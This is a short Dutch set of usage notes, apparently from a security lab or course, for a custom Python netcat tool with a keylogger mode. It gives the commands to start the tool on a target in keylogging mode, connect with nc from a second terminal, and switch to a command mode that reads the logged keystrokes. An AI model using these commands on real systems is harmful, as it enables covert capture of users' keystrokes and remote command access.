KEYLOGGER: 
Netcat script starten op target met: 
python3 netcat.py -t 172.21.20.111 -p 5500 -l -lk

Verbinden met 2de terminal:
nc 172.21.20.111 

Alles dat wordt getypt op de target wordt gelogd naar een file op de target zelf. 
Om deze file uit te lezen zal je "-lk" vervangen door "-c" dan kan je deze file uitlezen.

